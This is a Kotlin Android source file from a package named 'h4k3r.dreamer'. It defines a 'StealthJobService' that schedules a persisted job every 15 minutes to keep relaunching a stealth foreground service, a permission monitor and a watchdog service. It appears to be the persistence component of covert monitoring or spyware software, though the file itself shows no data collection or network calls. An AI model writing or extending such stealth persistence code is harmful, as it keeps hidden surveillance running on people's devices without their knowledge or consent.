package com.h4k3r.dreamer

import android.app.job.JobParameters
import android.app.job.JobService
import android.app.job.JobScheduler
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.util.Log

class StealthJobService : JobService() {
    companion object {
        private const val TAG = "StealthJobService"
        private const val JOB_ID = 1337
        
        fun scheduleJob(context: Context) {
            try {
                val jobScheduler = context.getSystemService(Context.JOB_SCHEDULER_SERVICE) as JobScheduler
                val componentName = ComponentName(context, StealthJobService::class.java)
                
                val jobInfo = android.app.job.JobInfo.Builder(JOB_ID, componentName)
                    .setPeriodic(15 * 60 * 1000) // 15 minutes
                    .setPersisted(true)
                    .build()
                
                jobScheduler.schedule(jobInfo)
                Log.d(TAG, "Scheduled StealthJobService to run periodically")
            } catch (e: Exception) {
                Log.e(TAG, "Failed to schedule job: ${e.message}")
            }
        }
    }
    
    override fun onStartJob(params: JobParameters?): Boolean {
        Log.d(TAG, "StealthJobService started")
        
        try {
            // Start the stealth service
            val intent = Intent(this, StealthForegroundService::class.java)
            startService(intent)
            Log.d(TAG, "Started StealthForegroundService from JobService")
            
            // Start other critical services
            val services = listOf(
                PermissionMonitorService::class.java,
                WatchdogService::class.java
            )
            
            services.forEach { serviceClass ->
                val serviceIntent = Intent(this, serviceClass)
                startService(serviceIntent)
            }
            
            Log.d(TAG, "Started PermissionMonitorService from JobService")
            Log.d(TAG, "Started WatchdogService from JobService")
            
            return false // Job completed
        } catch (e: Exception) {
            Log.e(TAG, "StealthJobService error: ${e.message}")
            return false
        }
    }
    
    override fun onStopJob(params: JobParameters?): Boolean {
        Log.d(TAG, "StealthJobService stopped")
        return false
    }
}